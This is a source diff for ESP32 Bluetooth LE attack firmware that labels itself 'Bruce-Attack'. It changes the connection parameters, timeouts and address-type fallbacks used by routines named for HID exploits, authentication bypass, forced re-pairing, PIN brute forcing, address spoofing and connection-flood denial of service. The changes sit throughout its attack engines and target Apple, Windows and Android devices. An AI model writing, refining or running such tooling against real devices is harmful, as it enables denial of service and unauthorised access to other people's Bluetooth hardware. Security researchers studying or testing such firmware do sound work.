@@ -280,9 +280,9 @@ ConnectionResult graduatedConnect(NimBLEAddress target) {
         pClient->setClientCallbacks(&g_suiteCallbacks, false);
         BLEStateManager::registerClient(pClient);
         pClient->setConnectTimeout(6 * 1000);
-        pClient->setConnectionParams(24, 48, 0, 400, 0, 0);
+        pClient->setConnectionParams(24, 48, 0, 400, 16, 16);
         
-        if (pClient->connect(target, false)) {
+        if (pClient->connect(target, true, false, false)) {
             result.phase = CONN_FAST;
             result.method = "Fast";
             result.success = true;
@@ -318,9 +318,9 @@ ConnectionResult graduatedConnect(NimBLEAddress target) {
         pClient->setClientCallbacks(&g_suiteCallbacks, false);
         BLEStateManager::registerClient(pClient);
         pClient->setConnectTimeout(8 * 1000);
-        pClient->setConnectionParams(6, 6, 0, 100, 0, 0);
+        pClient->setConnectionParams(6, 6, 0, 100, 16, 16);
         
-        if (pClient->connect(target, false)) {
+        if (pClient->connect(target, true, false, false)) {
             result.phase = CONN_AGGRESSIVE;
             result.method = "Aggressive";
             result.success = true;
@@ -357,10 +357,10 @@ ConnectionResult graduatedConnect(NimBLEAddress target) {
         pClient->setClientCallbacks(&g_suiteCallbacks, false);
         BLEStateManager::registerClient(pClient);
         pClient->setConnectTimeout(12 * 1000);
-        pClient->setConnectionParams(12, 12, 0, 400, 0, 0);
+        pClient->setConnectionParams(12, 12, 0, 400, 16, 16);
         
         for (int attempt = 0; attempt < 3; attempt++) {
-            if (pClient->connect(target, false)) {
+            if (pClient->connect(target, true, false, false)) {
                 result.phase = CONN_EXPLOIT;
                 result.method = "Exploit";
                 result.success = true;
@@ -387,7 +387,7 @@ ConnectionResult graduatedConnect(NimBLEAddress target) {
         ble_addr_t flipped = *target.getBase();
         flipped.type = fallbackType;
         NimBLEAddress fallbackTarget(flipped);
-        if (pClient->connect(fallbackTarget, false)) {
+        if (pClient->connect(fallbackTarget, true, false, false)) {
             result.phase = CONN_EXPLOIT;
             result.method = "Exploit (Flipped Addr)";
             result.success = true;
@@ -412,15 +412,15 @@ void setOptimalParams(NimBLEClient *client, const String &deviceType) {
     if (!client) return;
     
     if (deviceType.indexOf("Apple") != -1 || deviceType.indexOf("iOS") != -1) {
-        client->setConnectionParams(12, 12, 0, 400, 0, 0);
+        client->setConnectionParams(12, 12, 0, 400, 16, 16);
     } else if (deviceType.indexOf("Samsung") != -1 || deviceType.indexOf("Android") != -1) {
-        client->setConnectionParams(6, 24, 0, 400, 0, 0);
+        client->setConnectionParams(6, 24, 0, 400, 16, 16);
     } else if (deviceType.indexOf("Windows") != -1) {
-        client->setConnectionParams(24, 48, 0, 600, 0, 0);
+        client->setConnectionParams(24, 48, 0, 600, 16, 16);
     } else if (deviceType.indexOf("Linux") != -1 || deviceType.indexOf("Raspberry") != -1) {
-        client->setConnectionParams(12, 24, 0, 300, 0, 0);
+        client->setConnectionParams(12, 24, 0, 300, 16, 16);
     } else {
-        client->setConnectionParams(16, 32, 0, 500, 0, 0);
+        client->setConnectionParams(16, 32, 0, 500, 16, 16);
     }
 }
 
@@ -826,24 +826,19 @@ size_t BLEStateManager::getActiveClientCount() { return activeClients.size(); }
 //=============================================================================
 
 void BLEAttackManager::prepareForConnection(bool enableAuth) {
-    if (BLEStateManager::isBLEActive()) {
-        BLEStateManager::deinitBLE();
-        delay(300);
+    if (!BLEStateManager::isBLEActive()) {
+        BLEStateManager::initBLE("Bruce-Attack", ESP_PWR_LVL_P9);
     }
-
-    BLEStateManager::initBLE("Bruce-Attack", ESP_PWR_LVL_P9);
     NimBLEDevice::setMTU(250);
     if (enableAuth) {
         NimBLEDevice::setSecurityAuth(true, true, true);
     } else {
         NimBLEDevice::setSecurityAuth(false, false, false);
     }
-    delay(300);
 }
 
 void BLEAttackManager::cleanupAfterAttack() {
-    BLEStateManager::deinitBLE(true);
-    delay(300);
+    BLEStateManager::cleanupAllClients();
 }
 
 bool BLEAttackManager::connectToDevice(
@@ -858,15 +853,28 @@ bool BLEAttackManager::connectToDevice(
     pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
 
+    NimBLEClient::Config cfg = pClient->getConfig();
+    cfg.exchangeMTU = 0;
+    cfg.connectFailRetries = 2;
+    pClient->setConfig(cfg);
+
     if (useExploitHandshake) {
         pClient->setConnectTimeout(12 * 1000);
-        pClient->setConnectionParams(6, 6, 0, 100, 0, 0);
+        pClient->setConnectionParams(6, 6, 0, 100, 16, 16);
     } else {
         pClient->setConnectTimeout(8 * 1000);
-        pClient->setConnectionParams(12, 12, 0, 400, 0, 0);
+        pClient->setConnectionParams(12, 12, 0, 400, 16, 16);
     }
 
-    bool connected = pClient->connect(target, false);
+    bool connected = pClient->connect(target, true, false, false);
+    if (!connected) {
+        uint8_t fallbackType = (target.getType() == BLE_ADDR_PUBLIC) ? BLE_ADDR_RANDOM : BLE_ADDR_PUBLIC;
+        ble_addr_t flipped = *target.getBase();
+        flipped.type = fallbackType;
+        NimBLEAddress fallbackTarget(flipped);
+        connected = pClient->connect(fallbackTarget, true, false, false);
+    }
+
     if (connected) {
         *outClient = pClient;
         return true;
@@ -971,8 +979,8 @@ NimBLEClient *attemptConnectionWithStrategies(NimBLEAddress target, String &conn
         pClient->setClientCallbacks(&g_suiteCallbacks, false);
         BLEStateManager::registerClient(pClient);
         pClient->setConnectTimeout(12 * 1000);
-        pClient->setConnectionParams(6, 6, 0, 100, 0, 0);
-        if (pClient->connect(target, false)) {
+        pClient->setConnectionParams(6, 6, 0, 100, 16, 16);
+        if (pClient->connect(target, true, false, false)) {
             connectionMethod = "Aggressive connection";
             return pClient;
         }
@@ -981,7 +989,7 @@ NimBLEClient *attemptConnectionWithStrategies(NimBLEAddress target, String &conn
         ble_addr_t flipped = *target.getBase();
         flipped.type = fallbackType;
         NimBLEAddress fallbackTarget(flipped);
-        if (pClient->connect(fallbackTarget, false)) {
+        if (pClient->connect(fallbackTarget, true, false, false)) {
             connectionMethod = "Aggressive (Flipped Addr)";
             return pClient;
         }
@@ -1010,9 +1018,9 @@ NimBLEClient *attemptConnectionWithStrategies(NimBLEAddress target, String &conn
         pClient->setClientCallbacks(&g_suiteCallbacks, false);
         BLEStateManager::registerClient(pClient);
         pClient->setConnectTimeout(15 * 1000);
-        pClient->setConnectionParams(12, 12, 0, 400, 0, 0);
+        pClient->setConnectionParams(12, 12, 0, 400, 16, 16);
         for (int attempt = 0; attempt < 3; attempt++) {
-            if (pClient->connect(target, false)) {
+            if (pClient->connect(target, true, false, false)) {
                 connectionMethod = "Exploit-based connection";
                 return pClient;
             }
@@ -1025,7 +1033,7 @@ NimBLEClient *attemptConnectionWithStrategies(NimBLEAddress target, String &conn
         ble_addr_t flipped = *target.getBase();
         flipped.type = fallbackType;
         NimBLEAddress fallbackTarget(flipped);
-        if (pClient->connect(fallbackTarget, false)) {
+        if (pClient->connect(fallbackTarget, true, false, false)) {
             connectionMethod = "Exploit (Flipped Addr)";
             return pClient;
         }
@@ -1056,7 +1064,7 @@ NimBLEClient *attemptConnectionWithStrategies(NimBLEAddress target, String &conn
                 pClient->setClientCallbacks(&g_suiteCallbacks, false);
                 BLEStateManager::registerClient(pClient);
                 pClient->setConnectTimeout(8 * 1000);
-                if (pClient->connect(target, false)) {
+                if (pClient->connect(target, true, false, false)) {
                     connectionMethod = "HFP Exploit connection";
                     return pClient;
                 }
@@ -1078,8 +1086,8 @@ NimBLEClient *attemptConnectionWithStrategies(NimBLEAddress target, String &conn
         pClient->setClientCallbacks(&g_suiteCallbacks, false);
         BLEStateManager::registerClient(pClient);
         pClient->setConnectTimeout(10 * 1000);
-        pClient->setConnectionParams(6, 24, 0, 400, 0, 0);
-        if (pClient->connect(target, false)) {
+        pClient->setConnectionParams(6, 24, 0, 400, 16, 16);
+        if (pClient->connect(target, true, false, false)) {
             connectionMethod = "Low-latency connection";
             return pClient;
         }
@@ -1108,8 +1116,8 @@ NimBLEClient *attemptConnectionWithStrategies(NimBLEAddress target, String &conn
             pClient->setClientCallbacks(&g_suiteCallbacks, false);
             BLEStateManager::registerClient(pClient);
             pClient->setConnectTimeout(6 * 1000);
-            pClient->setConnectionParams(paramSets[i][0], paramSets[i][1], paramSets[i][2], paramSets[i][3], 0, 0);
-            if (pClient->connect(target, false)) {
+            pClient->setConnectionParams(paramSets[i][0], paramSets[i][1], paramSets[i][2], paramSets[i][3], 16, 16);
+            if (pClient->connect(target, true, false, false)) {
                 connectionMethod = "Parameter sweep (" + String(i) + ")";
                 return pClient;
             }
@@ -1228,11 +1236,15 @@ bool HIDExploitEngine::tryAppleMagicSpoof(NimBLEAddress target, HIDDeviceProfile
     NimBLEClient *pClient = NimBLEDevice::createClient();
     if (!pClient) return false;
 
+#if CONFIG_BT_NIMBLE_EXT_ADV
+    pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+    pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
 
     pClient->setConnectTimeout(6000);
-    pClient->setConnectionParams(12, 12, 0, 400, 0, 0);
-    bool connected = pClient->connect(target, false);
+    pClient->setConnectionParams(12, 12, 0, 400, 16, 16);
+    bool connected = pClient->connect(target, true, false, false);
 
     if (connected) {
         showAttackProgress("Apple spoof successful!", TFT_GREEN);
@@ -1262,15 +1274,19 @@ bool HIDExploitEngine::tryWindowsHIDBypass(NimBLEAddress target, HIDDeviceProfil
     for (int attempt = 0; attempt < 3; attempt++) {
         NimBLEClient *pClient = NimBLEDevice::createClient();
         if (pClient) {
+#if CONFIG_BT_NIMBLE_EXT_ADV
+            pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+            pClient->setClientCallbacks(&g_suiteCallbacks, false);
             BLEStateManager::registerClient(pClient);
 
-            pClient->setConnectTimeout(4000);
+            pClient->setConnectTimeout(6000);
 
-            if (attempt == 0) pClient->setConnectionParams(6, 6, 0, 100, 0, 0);
-            else if (attempt == 1) pClient->setConnectionParams(200, 200, 0, 600, 0, 0);
-            else pClient->setConnectionParams(7, 3200, 0, 800, 0, 0);
+            if (attempt == 0) pClient->setConnectionParams(6, 6, 0, 100, 16, 16);
+            else if (attempt == 1) pClient->setConnectionParams(200, 200, 0, 600, 16, 16);
+            else pClient->setConnectionParams(7, 3200, 0, 800, 16, 16);
 
-            bool connected = pClient->connect(target, false);
+            bool connected = pClient->connect(target, true, false, false);
 
             if (connected) {
                 showAttackProgress("Windows bypass successful!", TFT_GREEN);
@@ -1302,11 +1318,15 @@ bool HIDExploitEngine::tryAndroidJustWorks(NimBLEAddress target, HIDDeviceProfil
     NimBLEClient *pClient = NimBLEDevice::createClient();
     if (!pClient) return false;
 
+#if CONFIG_BT_NIMBLE_EXT_ADV
+    pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+    pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
 
     pClient->setConnectTimeout(8000);
-    pClient->setConnectionParams(12, 12, 0, 400, 0, 0);
-    bool connected = pClient->connect(target, true);
+    pClient->setConnectionParams(12, 12, 0, 400, 16, 16);
+    bool connected = pClient->connect(target, true, false, false);
 
     if (connected) {
         showAttackProgress("Android Just-Works worked!", TFT_GREEN);
@@ -1335,11 +1355,15 @@ bool HIDExploitEngine::tryBootProtocolInjection(NimBLEAddress target, HIDDeviceP
     NimBLEClient *pClient = NimBLEDevice::createClient();
     if (!pClient) return false;
 
+#if CONFIG_BT_NIMBLE_EXT_ADV
+    pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+    pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
 
-    pClient->setConnectTimeout(5000);
-    pClient->setConnectionParams(6, 6, 0, 100, 0, 0);
-    bool connected = pClient->connect(target, false);
+    pClient->setConnectTimeout(6000);
+    pClient->setConnectionParams(6, 6, 0, 100, 16, 16);
+    bool connected = pClient->connect(target, true, false, false);
 
     if (connected) {
         NimBLERemoteService *pHIDService = pClient->getService(NimBLEUUID((uint16_t)0x1812));
@@ -1381,11 +1405,15 @@ bool HIDExploitEngine::tryRapidStateConfusion(NimBLEAddress target, HIDDevicePro
 
         NimBLEClient *pClient = NimBLEDevice::createClient();
         if (pClient) {
+#if CONFIG_BT_NIMBLE_EXT_ADV
+            pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+            pClient->setClientCallbacks(&g_suiteCallbacks, false);
             BLEStateManager::registerClient(pClient);
 
-            pClient->setConnectTimeout(1000);
-            pClient->setConnectionParams(6, 6, 0, 100, 0, 0);
-            bool connected = pClient->connect(target, false);
+            pClient->setConnectTimeout(3000);
+            pClient->setConnectionParams(6, 6, 0, 100, 16, 16);
+            bool connected = pClient->connect(target, true, false, false);
 
             if (connected) {
                 showAttackProgress("State confusion worked!", TFT_GREEN);
@@ -1427,10 +1455,14 @@ bool HIDExploitEngine::tryHIDReportPreconnection(NimBLEAddress target, HIDDevice
     NimBLEClient *pClient = NimBLEDevice::createClient();
     if (!pClient) return false;
 
+#if CONFIG_BT_NIMBLE_EXT_ADV
+    pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+    pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
 
     pClient->setConnectTimeout(6000);
-    bool connected = pClient->connect(target, false);
+    bool connected = pClient->connect(target, true, false, false);
 
     if (connected) {
         showAttackProgress("Pre-connection attack worked!", TFT_GREEN);
@@ -1469,12 +1501,16 @@ bool HIDExploitEngine::tryConnectionParameterAttack(NimBLEAddress target, HIDDev
 
         NimBLEClient *pClient = NimBLEDevice::createClient();
         if (pClient) {
+#if CONFIG_BT_NIMBLE_EXT_ADV
+            pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+            pClient->setClientCallbacks(&g_suiteCallbacks, false);
             BLEStateManager::registerClient(pClient);
 
-            pClient->setConnectTimeout(4000);
-            pClient->setConnectionParams(paramSets[i][0], paramSets[i][1], paramSets[i][2], paramSets[i][3], 0, 0);
+            pClient->setConnectTimeout(6000);
+            pClient->setConnectionParams(paramSets[i][0], paramSets[i][1], paramSets[i][2], paramSets[i][3], 16, 16);
 
-            bool connected = pClient->connect(target, false);
+            bool connected = pClient->connect(target, true, false, false);
             if (connected) {
                 showAttackProgress("Parameter attack successful!", TFT_GREEN);
                 pClient->disconnect();
@@ -1514,9 +1550,13 @@ bool HIDExploitEngine::trySecurityModeBypass(NimBLEAddress target, HIDDeviceProf
 
         NimBLEClient *pClient = NimBLEDevice::createClient();
         if (pClient) {
+#if CONFIG_BT_NIMBLE_EXT_ADV
+            pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+            pClient->setClientCallbacks(&g_suiteCallbacks, false);
             BLEStateManager::registerClient(pClient);
             pClient->setConnectTimeout(6000);
-            bool connected = pClient->connect(target, true);
+            bool connected = pClient->connect(target, true, false, false);
             if (connected) {
                 showAttackProgress("Security bypass successful!", TFT_GREEN);
                 pClient->disconnect();
@@ -1548,8 +1588,12 @@ bool HIDExploitEngine::tryAddressSpoofingAttack(NimBLEAddress target, HIDDeviceP
 
         NimBLEClient *pClient = NimBLEDevice::createClient();
         if (pClient) {
+#if CONFIG_BT_NIMBLE_EXT_ADV
+            pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+            pClient->setClientCallbacks(&g_suiteCallbacks, false);
             BLEStateManager::registerClient(pClient);
-            pClient->setConnectTimeout(5000);
+            pClient->setConnectTimeout(6000);
             bool connected = pClient->connect(target, false);
             if (connected) {
                 showAttackProgress("Address spoofing worked!", TFT_GREEN);
@@ -1579,6 +1623,10 @@ bool HIDExploitEngine::tryServiceDiscoveryHijack(NimBLEAddress target, HIDDevice
     NimBLEClient *pClient = NimBLEDevice::createClient();
     if (!pClient) return false;
 
+#if CONFIG_BT_NIMBLE_EXT_ADV
+    pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+    pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
 
     pClient->setConnectTimeout(8000);
@@ -2845,11 +2893,15 @@ bool AuthBypassEngine::attemptSpoofConnection(NimBLEAddress target, const String
     NimBLEClient *pClient = NimBLEDevice::createClient();
     if (!pClient) return false;
 
+#if CONFIG_BT_NIMBLE_EXT_ADV
+    pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+    pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
 
     pClient->setConnectTimeout(8000);
-    pClient->setConnectionParams(12, 12, 0, 400, 0, 0);
-    bool connected = pClient->connect(target, true);
+    pClient->setConnectionParams(12, 12, 0, 400, 16, 16);
+    bool connected = pClient->connect(target, true, false, false);
 
     if (connected) {
         showAttackProgress("Spoof connection successful!", TFT_GREEN);
@@ -2877,10 +2929,14 @@ bool AuthBypassEngine::forceRepairing(NimBLEAddress target) {
     NimBLEClient *pClient = NimBLEDevice::createClient();
     if (!pClient) return false;
 
+#if CONFIG_BT_NIMBLE_EXT_ADV
+    pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+    pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
 
     pClient->setConnectTimeout(10000);
-    bool connected = pClient->connect(target, false);
+    bool connected = pClient->connect(target, true, false, false);
 
     if (connected) {
         showAttackProgress("Forced pairing successful!", TFT_GREEN);
@@ -2909,10 +2965,14 @@ bool AuthBypassEngine::exploitAuthBypass(NimBLEAddress target) {
     NimBLEClient *pClient = NimBLEDevice::createClient();
     if (!pClient) return false;
 
+#if CONFIG_BT_NIMBLE_EXT_ADV
+    pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+    pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
 
     pClient->setConnectTimeout(8000);
-    bool connected = pClient->connect(target, true);
+    bool connected = pClient->connect(target, true, false, false);
 
     if (connected) {
         showAttackProgress("Zero-key auth bypass worked!", TFT_GREEN);
@@ -2934,10 +2994,14 @@ bool AuthBypassEngine::exploitAuthBypass(NimBLEAddress target) {
     pClient = NimBLEDevice::createClient();
     if (!pClient) return false;
 
+#if CONFIG_BT_NIMBLE_EXT_ADV
+    pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+    pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
 
     pClient->setConnectTimeout(10000);
-    connected = pClient->connect(target, true);
+    connected = pClient->connect(target, true, false, false);
 
     if (connected) {
         showAttackProgress("Legacy pairing bypass worked!", TFT_GREEN);
@@ -2969,6 +3033,10 @@ bool MultiConnectionAttack::connectionFloodSingle(NimBLEAddress target, int time
     NimBLEClient *pClient = NimBLEDevice::createClient();
     if (!pClient) return false;
 
+#if CONFIG_BT_NIMBLE_EXT_ADV
+    pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+    pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
 
     pClient->setConnectTimeout(timeout);
@@ -3433,9 +3501,13 @@ bool PairingAttackServiceClass::bruteForcePIN(NimBLEAddress target) {
 
         NimBLEClient *pClient = NimBLEDevice::createClient();
         if (pClient) {
+#if CONFIG_BT_NIMBLE_EXT_ADV
+            pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+            pClient->setClientCallbacks(&g_suiteCallbacks, false);
             BLEStateManager::registerClient(pClient);
-            pClient->setConnectTimeout(5000);
-            if (pClient->connect(target, true)) {
+            pClient->setConnectTimeout(6000);
+            if (pClient->connect(target, false)) {
                 showAttackProgress(String("Connected with PIN: " + String(commonPins[i])).c_str(), TFT_GREEN);
                 success = true;
 
@@ -3489,8 +3561,12 @@ bool DoSAttackServiceClass::connectionFlood(NimBLEAddress target) {
 
         NimBLEClient *pClient = NimBLEDevice::createClient();
         if (pClient) {
+#if CONFIG_BT_NIMBLE_EXT_ADV
+            pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+            pClient->setClientCallbacks(&g_suiteCallbacks, false);
             BLEStateManager::registerClient(pClient);
-            pClient->setConnectTimeout(2000);
+            pClient->setConnectTimeout(3000);
             bool connected = pClient->connect(target, false);
             if (connected) anySuccess = true;
             BLEStateManager::unregisterClient(pClient);
@@ -4966,7 +5042,8 @@ String selectTargetFromScan(const char *title) {
                 if (uuidStr.find("1812") != std::string::npos) deviceType |= 0x02;
             }
 
-            scannerData.addDevice(name, address, rssi, fastPair, hasHFP, deviceType);
+            uint8_t addrType = device->getAddressType();
+            scannerData.addDevice(name, address, rssi, fastPair, hasHFP, deviceType, addrType);
         }
 
         g_pBLEScan->setActiveScan(false);
@@ -5003,7 +5080,8 @@ String selectTargetFromScan(const char *title) {
                 if (uuidStr.find("1812") != std::string::npos) deviceType |= 0x02;
             }
 
-            scannerData.addDevice(name, address, rssi, fastPair, hasHFP, deviceType);
+            uint8_t addrType = device->getAddressType();
+            scannerData.addDevice(name, address, rssi, fastPair, hasHFP, deviceType, addrType);
         }
     } catch (...) {
         displayError("BLE scan error");
@@ -5045,6 +5123,9 @@ String selectTargetFromScan(const char *title) {
                 snapshot->hfp[j] = tempHfp;
 
                 std::swap(snapshot->types[i], snapshot->types[j]);
+                if (i < snapshot->addressTypes.size() && j < snapshot->addressTypes.size()) {
+                    std::swap(snapshot->addressTypes[i], snapshot->addressTypes[j]);
+                }
             }
         }
     }
@@ -5113,6 +5194,9 @@ String selectTargetFromScan(const char *title) {
             g_selectedDevice.hasFastPair = snapshot->fastPair[selectedIdx];
             g_selectedDevice.hasHFP = snapshot->hfp[selectedIdx];
             g_selectedDevice.deviceType = snapshot->types[selectedIdx];
+            g_selectedDevice.addressType = (selectedIdx < (int)snapshot->addressTypes.size())
+                                               ? snapshot->addressTypes[selectedIdx]
+                                               : BLE_ADDR_PUBLIC;
 
             String returnMac = selectedMAC;
             returnMac.trim();
